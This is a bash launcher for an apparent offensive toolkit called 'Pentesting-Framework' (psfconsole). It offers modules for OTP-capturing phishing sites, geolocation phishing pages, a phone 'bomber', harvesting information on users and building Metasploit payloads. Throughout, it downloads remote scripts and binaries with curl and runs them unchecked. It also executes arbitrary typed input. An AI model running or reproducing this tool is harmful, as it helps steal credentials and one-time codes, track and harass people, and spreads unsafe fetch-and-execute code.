#!/usr/bin/env bash

#┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
#┃ Project : Pentesting-Framework                              ┃
#┃ Author  : ABHacker Official                                 ┃
#┃ Version : 6.8.0 (Latest)                                    ┃
#┃ Github  : abhackerofficial <github.com/abhackerofficial>    ┃
#┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

__return__ () {
source __return__ &> /dev/null
if [[ ! $? == 105 ]]
then
printf 105
fi
}

set +x

__return__=$(printf "$(__return__)")

WAIT() {
sleep 0.01
}

# Variable

export RAWLINK=https://raw.githubusercontent.com/abhackerofficial/pentesting-framework/master
export GITLINK=https://github.com/abhackerofficial/pentesting-framework
export OS=$(uname -o | grep -o "Android")
export OUTPUT=$HOME/.history.psf
CWD=$(pwd)
MODULE=06
VAR=6.8.0
NUM=1

# modules list

if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/list.modules
else
source <(curl -sLo- "${RAWLINK}/assets/programs/list.modules")
fi

# modules name

declare -a MODULES=(
notpweb
otpweb
gpsweb
bomber
inform
payload
)

# Colors

C0="$(printf '\033[90m')"
C1="$(printf '\033[91m')"
C2="$(printf '\033[92m')"
C3="$(printf '\033[93m')"
C4="$(printf '\033[94m')"
C5="$(printf '\033[95m')"
C6="$(printf '\033[96m')"
C7="$(printf '\033[97m')"
R0="$(printf '\033[00m')"
R1="$(printf '\033[01m')"
R2="$(printf '\033[02m')"
R3="$(printf '\033[03m')"
R4="$(printf '\033[04m')"
R5="$(printf '\033[05m')"

# Sign

r0SIGN="${C1}(${R0}>${C1})${R0}"
r1SIGN="${C1}(${R0}!${C1})${R0}"

g0SIGN="${C2}(${R0}>${C2})${R0}"
g1SIGN="${C2}(${R0}!${C2})${R0}"

b0SIGN="${C4}(${R0}>${C4})${R0}"
b1SIGN="${C4}(${R0}!${C4})${R0}"

# System Checker

function screenSize() {
    if ! hash tput &> /dev/null
    then
    apt install -y ncurses-utils
    fi

      SIZE=$(tput cols)

                if [ ! ${SIZE} -gt "60" ]
                then
                printf "\nYour Terminal Window Size must be above ${C2}60${R0} >= ${C1}${SIZE}${R0}\nPinch two fingers together on the screen to zoom out.\n"
                fi
}

if [[ $OS == *'Android'* ]];then
screenSize
TMPDIR=/data/data/com.termux/files/usr/tmp
pm() {
apt install -y $1
}
else
TMPDIR=/tmp
# Package Managers
    distro=$(source /etc/os-release && echo $ID)
    case $distro in
        arch)
            pm() {
		sudo pacman -Sy --noconfirm $1
		}
            ;;
        ubuntu)
            pm() {
		sudo apt-get install -y $1
		}
            ;;
        linuxmint)
            pm() { sudo apt-get install -y $1
		}
            ;;
        kali)
            pm() { sudo apt-get install -y $1
		}
            ;;
        parrot)
            pm() { sudo apt-get install -y $1
		}
            ;;
        debian)
            pm() { sudo apt-get install -y $1
		}
            ;;
        void)
            pm() { sudo xbps-install $1
		}
            ;;
        manjaro)
            pm() { sudo pacman -Sy $1
		}
            ;;
        garuda)
            pm() { sudo pacman -Sy $1
		}
            ;;
        alpine)
            pm() { sudo apk add $1
		}
            ;;
        gentoo)
            pm() { sudo emerge --ask $1
		}
            ;;
        fedora)
            pm() { sudo dnf install -y $1
		}
            ;;
        predator)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        artix)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        puppy_fossapup64)
            pm() { sudo pkg -d $1 && sudo pkg -i $1
		}
            ;;
        raspbian)
            pm() { sudo apt install -y $1
		}
            ;;
        endeavouros)
            pm() { sudo pacman -Sy --noconfirm $1
		}
            ;;
        freebsd)
            pm() { sudo pkg install -y $1
		}
            ;;
        *)
          echo "Sorry, but your System doesn't support [package manager] !"
          # Add manualy to use package manager to start psfconsole !
            exit 0
            ;;
    esac
fi

if ! hash svn &> /dev/null
then
pm subversion
elif ! hash php &> /dev/null
then
pm php
elif ! hash git &> /dev/null
then
pm git
elif ! hash jq &> /dev/null
then
pm jq
elif ! hash curl &> /dev/null
then
pm curl
elif ! hash python &> /dev/null
then
pm python
fi

if ! hash svn php git jq curl python &> /dev/null
then
printf "${C1}\e[1mE:${R0} Unable to run psfconsole right now Cause :\n"
printf "${C1}\e[1mE:${R0} Dependencies are not Installed yet (psfconsole)\n"
exit 1
fi

sudoPERM() {
if [[ $OS == *'Android'* ]];then
:
else
sudo -v
fi
}

killZONE() {
if [[ ! $__return__ == 105 ]];then
bash $CWD/assets/programs/progress.kill
else
bash <(curl -sL "${RAWLINK}/assets/programs/progress.kill")
fi
}

cacheFILES() {
if [[ ${MODE} == "withOTPWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${XSITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withNOTPWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
elif [[ ${MODE} == "withGPSWEB" ]]
then
rm -rf "${SCRIPT_PATH[@]}"/"${GSITES[${input} -1]}" &> /dev/null
fi
}

interrupt () {
exit_on_signal_SIGINT () { killZONE
if [[ ! $__return__ == 105 ]];then
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
else
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
fi
}

exit_on_signal_SIGTSTP () { killZONE
if [[ ! $__return__ == 105 ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITES[${input} -1]}" &> /dev/null
if [[ ${ARG} == "-s" ]];then
if [[ ${SITENUM} == "${SITENUM}" ]];then
rm -rf "${SCRIPT_PATH[@]}"/"${SITENUM}" &> /dev/null
fi
else
cacheFILES
fi
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
else
printf "                                            \r"
echo -e "${r0SIGN} Interrupt program !                "
exit 0
fi
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTSTP SIGTSTP
}

# <<<--- Help Mode --->>>

helpCOMMANDS () {
echo -e "
${C4}Available Commands${R0}
================

    Command     Description
    -------     -----------
    ${C2}use${R0}         This command is used to call existing module${R1}s${R0}.
    ${C2}list${R0}        Launch a list of existing module${R1}s${R0}.
    ${C2}exit${R0}        Exit Pentesting Framework instance.
    ${C2}search${R0}      Search Available module.
    ${C2}clear${R0}       Clear screen.
    ${C2}banner${R0}      Shows a random banner.

    Available Modules           Description
    -----------------------     -----------
    ${C2}use with:otpweb/handler${R0}     module to run with:notp phishing site${R1}s${R0}.
    ${C2}use with:notpweb/handler${R0}    module to run with:otp phishing site${R1}s${R0}.
    ${C2}use with:gpsweb/handler${R0}     module to create geolocation phishing site${R1}s${R0}.
    ${C2}use with:bomber/handler${R0}     module to perform a bombing attack.
    ${C2}use with:inform/handler${R0}     module to gather information of user${R1}s${R0}.
    ${C2}use with:payload/handler${R0}    module to create a metasploit payload
                                for your target device${R1}s${R0}.

    Upcomming Modules          Description
    -----------------------    -----------
    ${C6}use with:brute/handler${R0}     module to perform a bruteforce attack.
    ${C6}use with:secure/handler${R0}    module to secure your personal stuff.

${C4}psfconsole${R0}
==========

\`psfconsole\` is a bundle of penetration testing tools and an interface to Pentesting Framework.
This framework is currently undergoing heavy development. So, please be patient and keep an eye on this space!
"
}

# <<<--- Installer --->>>

if [[ ${1} == "-i" || ${1} == "--install" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/setup.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/setup.psfconsole")
fi
exit 0

elif [[ ${1} == "-u" || ${1} == "--update" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/update.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/update.psfconsole")
fi
exit 0

elif [[ ${1} == "-r" || ${1} == "--remove" ]];then
if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/remove.psfconsole
else
source <(curl -sLo- "${RAWLINK}/assets/programs/remove.psfconsole")
fi
exit 0
fi


if [[ ! $__return__ == 105 ]];then
source $CWD/assets/programs/credentials.site
else
source <(curl -sLo- "${RAWLINK}/assets/programs/credentials.site")
fi


# <<<--- Argument Menu ! --->>>

if [[ ${2} == "1" || ${2} == "01" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withOTPWEB/otpweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withOTPWEB/otpweb") ${1} ${2} ${3} ${4}
fi

elif [[ ${2} == "2" || ${2} == "02" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withNOTPWEB/notpweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withNOTPWEB/notpweb") ${1} ${2} ${3} ${4}
fi

elif [[ ${2} == "3" || ${2} == "03" ]]
then
  if [[ ! $__return__ == 105 ]];then
  source $CWD/programs/withGPSWEB/gpsweb ${1} ${2} ${3} ${4}
  else
  source <(curl -sLo- "${RAWLINK}/programs/withGPSWEB/gpsweb") ${1} ${2} ${3} ${4}
  fi
fi

randomBANNER() {
RANDOMs=$(echo $((1 + $RANDOM % 12)))
if [[ ! $__return__ == 105 ]];then
bash assets/logos/logo."${RANDOMs}"
else
bash <(curl -sL "${RAWLINK}/assets/logos/logo.${RANDOMs}")
fi
}

randomTIP() {
RANDOMs=$(echo $((1 + $RANDOM % 2)))

case ${RANDOMs} in
1)
       printf "Psfconsole tip: When in a module, use ${C2}back${R0} to go\n";WAIT
       printf "back to the top level prompt\n\n";WAIT
       ;;
2)
       printf "Psfconsole tip: You can use ${C2}help${R0} to view all\n";WAIT
       printf "available commands and modules.\n\n";WAIT
       ;;
esac
}

theHEADER() {
randomBANNER
printf "+ -- --=[ ${C3}psfconsole release v${VAR}${R0} ]=-- -- +\n";WAIT
printf "+ -- --=[ ${C2}${MODULE} modules are available${R0}  ]=-- -- +\n\n";WAIT
randomTIP
}

theHEADER


function psfHISTORY () {
NUM=1

if [[ ! -f $OUTPUT ]]
 then
 touch $OUTPUT
fi

LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')

overHISTORY() {
TOT=$((LOG-30))
sed -n "${TOT},${LOG}p" $OUTPUT > .temp.history.psf && mv .temp.history.psf $OUTPUT
}

if [[ ${LOG} -gt 50 ]]
then
cd $HOME || exit 1
overHISTORY
LOG=$(wc -l ${OUTPUT} | awk '{ print $1 }')
fi


i=1

fetch() {
while [ $i -le "${LOG}" ]
do
printf "...\n"
((i++))
done
}

FETCH=$(printf "$(fetch)")

declare -a LOGS=(
$(printf "${FETCH}")
)

historyLOOP() {
for i in "${LOGS[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  FILE=$(cat "$OUTPUT" | awk NR==${LOOP})
  history -s "${FILE}"
  ((NUM++))
  done
}
  historyLOOP
  LOOP=0
}

psf() {
psfHISTORY
read -r -e -p $'\e[4;0;0;4mpsf\e[0m > \e[0m' command
if [ ${#command} -gt 0 ]
then
if [[ $(cat "${OUTPUT}") == *"${command}"* ]]
then
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
sed -i "s,$command,,g" "$OUTPUT" | sed -i '/^$/d' "$OUTPUT"
echo "${command}" >> "$OUTPUT"
else
echo "${command}" >> "$OUTPUT"
fi
fi
}

showERROR() {
echo -e "${r0SIGN} Unsatisfied command ‘${@:1}’ :: execute '?'/'help'"
}

showHISTORY() {
while IFS= read -r line; do
    LOOP=$((${LOOP:-0}+1))
    printf "${LOOP}  $line\n"
done < "$OUTPUT"
LOOP=0
}


ignoreCOMMAND() {
if [[ ${command} == "set"* ]]
then
showERROR $command
command=""
fi

if [[ ${input-} == "set"* ]]
then
showERROR $input
input=""
fi
}


ignoreERROR() {
if [[ ${input} == "?" || ${input} == "help" ]]
then
   :

elif [[ ${input} == "list" ]]
then
   :

elif [[ ${input} == "back" ]]
then
   :

elif [[ ${input} == "banner" ]]
then
   :

elif [[ ${input} == "exit" ]]
then
   :

elif [[ ${input} == "q" ]]
then
   :

elif [[ ${input} == "clear" ]]
then
   :

elif [[ ${input} == *""* ]]
     then
  if [[ ${#input} -gt 0 ]]
   then
      $input &> /dev/null
  if [[ $? == 0 ]]
     then
        :
      else
         showERROR "$input"
         input=""
  fi
fi

else
  showERROR "$input"
  input=""
  fi
}

theERROR() {
command="$command"
  if [ ${#command} -gt 0 ]
   then
      showERROR $command
  fi

input="$input"

if [[ ${MODE} == "withBOMBER" ]]
then
  if [[ ${#input} -gt 0 ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withINFORM" ]]
then
  if [[ ${#input} -gt 0 ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withPAYLOAD" ]]
then
  if [[ ! ${input} -lt "9"  ]]
     then
      ignoreERROR
  fi
fi

if [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
 then
if [[ ${MODE} == "withOTPWEB" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withNOTPWEB" ]]
then
  if [[ ! ${input} -lt "31" ]]
     then
      ignoreERROR
  fi
elif [[ ${MODE} == "withGPSWEB" ]]
then
  if [[ ! ${input} -lt "5" ]]
     then
      ignoreERROR
  fi
fi

else
   if [[ ${#input} -gt 0 ]]
   then
      ignoreERROR
   fi
fi
}

getCOMMANDS() {
  if [[ ${command} == "use with:otpweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:notpweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:gpsweb/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:inform/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:bomber/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "use with:payload/handler" ]]
   then
      TRUE=true

  elif [[ ${command} == "?" || ${command} == "help" ]]
   then
      helpCOMMANDS
      command=""

  elif [[ ${command} == "banner" ]]
     then
        theHEADER
        command=""

  elif [[ ${command} == "list" ]]
     then
        echo -e "${g0SIGN} 'list' command only works with Modules! :: execute '?'/'help'"
        command=""

  elif [[ ${command} == "exit" ]]
     then
        echo -e "${g0SIGN} Existing psfconsole..."
        exit 0
        command=""

  elif [[ ${command} == "use" ]]
     then
        echo "Usage: use with:<module>/handler

Interact with a module by name term/index.
If a module name is not found, it will be treated as a search term.
An index from the exist module results can be selected if desired.

Examples:
  use with:info/handler
"
        command=""

  elif [[ ${command} == "search" ]]
     then
        echo "Usage: search module:<module>

Search with a module by name term/index.
If a module name is not found, it will be treated as a search term.
An index from the search results from exist module selected if desired.

Examples:
  search module:inform
"

        command=""

  elif [[ ${command} == "search module:"* ]]
     then
        INPUT="${command#search module:}"
for i in "${MODULES[@]}"
  do
  KEY=$(printf "%02d" $NUM)
  LOOP=$((${LOOP:-0}+1))
  CATCH=${i::$((${#i}))}
  if [[ ${CATCH} == ${INPUT} ]]
  then
     echo -e "Module \e[105m${INPUT}${R0} is Available."
     break
  fi
  ((NUM++))
  done

if [[ ${CATCH} != ${INPUT} ]]
  then
    echo -e "Module \e[101m${INPUT}${R0} is not Available."
fi
        LOOP=0
        command=""

  elif [[ ${command} == "q" ]]
     then
        clear
        exit 0
        command=""

  elif [[ ${command} == "clear" ]]
     then
        clear
        command=""

  elif [[ ${command} == "history" ]]
      then
         showHISTORY
         command=""

  elif [[ ${command} == *""* ]]
     then
        ignoreCOMMAND command
  if [[ ${#command} -gt 0 ]]
   then
      $command &> /dev/null
  if [[ $? == 0 ]]
     then
        echo -e "\e[94m(\e[0mexec\e[94m)\e[0m: ${command}"
        $command
        command=""
      else
         :
  fi
fi
  fi
}

extarnalCMD() {
  if [[ ${input} == "?" || ${input} == "help" ]]
   then
       helpCOMMANDS

   elif [[ ${input} == "back" ]]
      then
while true
do
         readCOMMAND
done
elif [[ ${input} == "banner" ]]
      then
         theHEADER

elif [[ ${input} == "exit" ]]
      then
         echo -e "${g0SIGN} Existing psfconsole..."
         exit 0

elif [[ ${input} == "q" ]]
      then
         clear
         exit 0

elif [[ ${input} == "clear" ]]
      then
         clear

elif [[ ${input} == *""* ]]
     then
        ignoreCOMMAND input
  if [[ ${#input} -gt 0 ]]
   then
      $input &> /dev/null
  if [[ $? == 0 ]]
     then
        echo -e "\e[94m(\e[0mexec\e[94m)\e[0m: ${input}"
        $input
        input=""
      else
         :
  fi
fi
  fi
}

readCONFIGURE () {
  if [[ ${command} == "use with:otpweb/handler" ]]
  then
     MODE=withOTPWEB
     echo -e "${b0SIGN} Using configured with:otpweb mode"
#     list1
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mwebpage/with:otpweb\e[0m) > ' input
     command=""

if [[ ${input} == "list" ]]
 then
    list1

elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
    if [[ ${input} -lt 31 ]]
    then
    if [[ ! $__return__ == 105 ]];then
    source $CWD/programs/withOTPWEB/otpweb
    else
    cd $TMPDIR || exit 1
    printf "${b0SIGN} Downloading Program...\r"
    source <(curl -sLo- "${RAWLINK}/programs/withOTPWEB/otpweb")
fi
fi
fi
     theERROR
     extarnalCMD
     done

  elif [[ ${command} == "use with:notpweb/handler" ]]
  then
     MODE=withNOTPWEB
     echo -e "${b0SIGN} Using configured with:notpweb mode"
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mwebpage/with:notpweb\e[0m) > ' input
     command=""

if [[ ${input} == "list" ]]
 then
    list2

elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
     if [[ ${input} -lt 31 ]]
     then
     if [[ ! $__return__ == 105 ]];then
     source $CWD/programs/withNOTPWEB/notpweb
     else
     cd $TMPDIR || exit 1
     printf "${b0SIGN} Downloading Program...\r"
     source <(curl -sLo- "${RAWLINK}/programs/withNOTPWEB/notpweb")
fi
fi
fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:gpsweb/handler" ]]
  then
     MODE=withGPSWEB
     echo -e "${b0SIGN} Using configured with:gpsweb mode"
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mwebpage/with:gpsweb\e[0m) > ' input
     command=""
if [[ ${input} == "list" ]]
 then
    list3

elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
   then
     if [[ ${input} -lt 5 ]]
     then
     if [[ ! $__return__ == 105 ]];then
     source $CWD/programs/withGPSWEB/gpsweb
     else
     cd $TMPDIR || exit 1
     printf "${b0SIGN} Downloading Program...\r"
     source <(curl -sLo- "${RAWLINK}/programs/withGPSWEB/gpsweb")
fi
fi
fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:bomber/handler" ]]
  then
     MODE=withBOMBER
     echo -e "${b0SIGN} Using configured with:bomber mode"
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mprogram/with:bomber\e[0m) > ' input
     command=""
     if [[ $input == "list" ]]
     then
     echo -e "\n${b0SIGN} set bomber\n"
     elif [[ ${input} == "set bomber" ]]
     then
        input=""
case $(dpkg --print-architecture) in
    aarch64)
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/bomber.aarch64
        else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.aarch64 |
       printf "${b0SIGN} Downloading Program...\r"
       chmod +x bomber.aarch64
       ./bomber.aarch64
       fi
        ;;
    arm*)
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/bomber.arm64
        else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.arm64 |
       printf "${b0SIGN} Downloading Program...\r"
       chmod +x bomber.arm64
       ./bomber.arm64
       fi
        ;;
    amd*)
        if [[ ! $__return__ == 105 ]];then
        $CWD/programs/withBOMBER/bomber.amd64
        else
       cd $TMPDIR
       curl -sLO ${RAWLINK}/programs/withBOMBER/bomber.amd64 |
       printf "${b0SIGN} Downloading Program...\r"
       chmod +x bomber.amd64
       ./bomber.amd64
       fi
        ;;
esac

       fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:inform/handler" ]]
  then
     MODE=withINFORM
     echo -e "${b0SIGN} Using configured with:inform mode"
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mprogram/with:inform\e[0m) > ' input
     command=""
     if [[ $input == "list" ]]
     then
     echo -e "\n${b0SIGN} set inform\n"
     elif [[ ${input} == "set inform" ]]
     then
        input=""
       if [[ ! $__return__ == 105 ]];then
       bash $CWD/programs/withINFORM/inform
       else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withINFORM/inform |
       printf "${b0SIGN} Downloading Program...\r"
       bash inform
       fi
       fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:payload/handler" ]]
  then
     MODE=withPAYLOAD
     echo -e "${b0SIGN} Using configured with:payload mode"
     while true
     do
     read -r -e -p $'\e[4mpsf\e[0m use(\e[91mprogram/with:payload\e[0m) > ' input
     command=""
     if [[ $input == "list" ]]
     then
     list6
     elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
     then
     if [[ ${input} -lt 9 ]]
     then
       if [[ ! $__return__ == 105 ]];then
       source $CWD/programs/withPAYLOAD/payload
       else
       cd $TMPDIR || exit 1
       printf "${b0SIGN} Downloading Program...\r"
       source <(curl -sLo- "${RAWLINK}/programs/withPAYLOAD/payload")
       fi
       fi
       fi
     theERROR
     extarnalCMD
     done
  fi
}

readCOMMAND() {
interrupt
while true
do
psf
getCOMMANDS
if [[ ${TRUE} == "true" ]]
then
  break & readCONFIGURE
fi
input=""
theERROR
done
}

sudoPERM
readCOMMAND

# <<<--- End --->>>
